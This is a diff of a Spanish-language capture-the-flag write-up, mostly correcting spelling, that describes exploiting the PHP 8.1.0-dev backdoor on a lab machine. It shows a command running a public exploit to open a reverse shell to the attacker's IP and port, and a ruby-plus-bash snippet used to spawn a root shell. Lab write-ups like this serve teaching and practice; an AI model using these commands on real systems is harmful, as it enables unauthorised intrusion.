@@ -78,16 +78,16 @@ No encontramos nada interesante
 
 ## Revisamos la pag web
 
-Cuando revisamos la web no nos encontramos  nada interesante ni ningun ususario potencial.
+Cuando revisamos la web no nos encontramos nada interesante ni ningún usuario potencial.
 
-## Intrusion 
-Para la intrusion nos damos cuenta que usa una version interesante de php `8.1.0-dev` por lo tnato vamos a ver si existe alguna vulnerabilidad interesante que se pueda explotar y enocntramos el siguiente repositorio.
+## Intrusión 
+Para la intrusión nos damos cuenta que usa una versión interesante de php `8.1.0-dev` por lo tanto vamos a ver si existe alguna vulnerabilidad interesante que se pueda explotar y encontramos el siguiente repositorio.
 
 ```
 https://github.com/flast101/php-8.1.0-dev-backdoor-rce
 ```
 
-Donde explica que nos encontramos ante una version de php que es vulnerable y podemos ejecutar comandos. Por lo tanto lo ejecutamos de la siguiente manera para entablar una rever shell:
+Donde explica que nos encontramos ante una versión de `php` que es vulnerable y podemos ejecutar comandos. Por lo tanto lo ejecutamos de la siguiente manera para entablar una revershell:
 
 ```shell
 python3 revshell_php_8.1.0-dev.py http://10.10.10.242/ 10.10.14.8 4444
@@ -103,7 +103,7 @@ stty raw -echo; fg
 reset xterm
 ```
 
-De esta manera ya tendremos una terminal totalmetne interactiva además de que podemos ir al directorio `/home` y ver la flag de user.txt
+De esta manera ya tendremos una terminal totalmente interactiva además de que podemos ir al directorio `/home` y ver la flag de user.txt
 
 
 
@@ -129,12 +129,13 @@ Si intentamos ejecutarlo nos encontramos que en el manual hay una opcion en la q
 
 para ello creo dos ficheros uno ruby y otro en bash 
 
-ruby.rb
+Fichero `ruby.rb`:
 ```rb
 # script.rb
 system("bash shell.sh")
 ```
-shell.sh
+y nuestro fichero `shell.sh`:
+
 ```shell
 #!/bin/bash
 exec bash -i
